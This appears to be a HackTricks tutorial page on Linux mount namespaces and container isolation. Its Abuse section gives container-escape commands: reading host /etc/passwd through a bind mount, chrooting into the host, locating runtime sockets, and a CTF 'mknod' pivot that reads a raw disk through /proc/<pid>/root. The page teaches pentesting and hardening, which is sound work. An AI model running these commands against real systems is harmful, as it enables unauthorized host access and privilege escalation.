# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Overview

The mount namespace controls the **mount table** that a process sees. This is one of the most important container isolation features because the root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure, and many runtime-specific helper mounts are all expressed through that mount table. Two processes may both access `/`, `/proc`, `/sys`, or `/tmp`, but what those paths resolve to depends on the mount namespace they are in.

From a container-security perspective, the mount namespace is often the difference between "this is a neatly prepared application filesystem" and "this process can directly see or influence the host filesystem". That is why bind mounts, `hostPath` volumes, privileged mount operations, and writable `/proc` or `/sys` exposures all revolve around this namespace.

## Operation

When a runtime launches a container, it usually creates a fresh mount namespace, prepares a root filesystem for the container, mounts procfs and other helper filesystems as needed, and then optionally adds bind mounts, tmpfs mounts, secrets, config maps, or host paths. Once that process is running inside the namespace, the set of mounts it sees is largely decoupled from the host's default view. The host may still see the real underlying filesystem, but the container sees the version assembled for it by the runtime.

This is powerful because it lets the container believe it has its own root filesystem even though the host is still managing everything. It is also dangerous because if the runtime exposes the wrong mount, the process suddenly gains visibility into host resources that the rest of the security model may not have been designed to protect.

## Lab

You can create a private mount namespace with:

```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```

If you open another shell outside that namespace and inspect the mount table, you will see that the tmpfs mount exists only inside the isolated mount namespace. This is a useful exercise because it shows that mount isolation is not abstract theory; the kernel is literally presenting a different mount table to the process.
If you open another shell outside that namespace and inspect the mount table, the tmpfs mount will exist only inside the isolated mount namespace.

Inside containers, a quick comparison is:

```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```

The second example demonstrates how easy it is for a runtime configuration to punch a huge hole through the filesystem boundary.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O all rely on a private mount namespace for normal containers. Kubernetes builds on top of the same mechanism for volumes, projected secrets, config maps, and `hostPath` mounts. Incus/LXC environments also rely heavily on mount namespaces, especially because system containers often expose richer and more machine-like filesystems than application containers do.

This means that when you review a container filesystem problem, you are usually not looking at an isolated Docker quirk. You are looking at a mount-namespace and runtime-configuration problem expressed through whatever platform launched the workload.

## Misconfigurations

The most obvious and dangerous mistake is exposing the host root filesystem or another sensitive host path through a bind mount, for example `-v /:/host` or a writable `hostPath` in Kubernetes. At that point, the question is no longer "can the container somehow escape?" but rather "how much useful host content is already directly visible and writable?" A writable host bind mount often turns the rest of the exploit into a simple matter of file placement, chrooting, config modification, or runtime socket discovery.

Another common problem is exposing host `/proc` or `/sys` in ways that bypass the safer container view. These filesystems are not ordinary data mounts; they are interfaces into kernel and process state. If the workload reaches the host versions directly, many of the assumptions behind container hardening stop applying cleanly.

Read-only protections matter too. A read-only root filesystem does not magically secure a container, but it removes a large amount of attacker staging space and makes persistence, helper-binary placement, and config tampering more difficult. Conversely, a writable root or writable host bind mount gives an attacker room to prepare the next step.

## Abuse

When the mount namespace is misused, attackers commonly do one of four things. They **read host data** that should have remained outside the container. They **modify host configuration** through writable bind mounts. They **mount or remount additional resources** if capabilities and seccomp allow it. Or they **reach powerful sockets and runtime state directories** that let them ask the container platform itself for more access.

If the container can already see the host filesystem, the rest of the security model changes immediately.

When you suspect a host bind mount, first confirm what is available and whether it is writable:

```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```

If the host root filesystem is mounted read-write, direct host access is often as simple as:

```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```

If the goal is privileged runtime access rather than direct chrooting, enumerate sockets and runtime state:

```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```

If `CAP_SYS_ADMIN` is present, also test whether new mounts can be created from inside the container:

```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```

### Full Example: Two-Shell `mknod` Pivot

A more specialized abuse path appears when the container root user can create block devices, the host and container share a user identity in a useful way, and the attacker already has a low-privilege foothold on the host. In that situation, the container can create a device node such as `/dev/sda`, and the low-privilege host user can later read it through `/proc/<pid>/root/` for the matching container process.

Inside the container:

```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```

From the host, as the matching low-privilege user after locating the container shell PID:

```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```

The important lesson is not the exact CTF string search. It is that mount-namespace exposure through `/proc/<pid>/root/` can let a host user reuse container-created device nodes even when cgroup device policy prevented direct use inside the container itself.

## Checks

These commands are there to show you the filesystem view the current process is actually living in. The goal is to spot host-derived mounts, writable sensitive paths, and anything that looks broader than a normal application container root filesystem.

```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```

What is interesting here:

- Bind mounts from the host, especially `/`, `/proc`, `/sys`, runtime state directories, or socket locations, should stand out immediately.
- Unexpected read-write mounts are usually more important than large numbers of read-only helper mounts.
- `mountinfo` is often the best place to see whether a path is really host-derived or overlay-backed.

These checks establish **which resources are visible in this namespace**, **which ones are host-derived**, and **which of them are writable or security-sensitive**.
{{#include ../../../../../banners/hacktricks-training.md}}
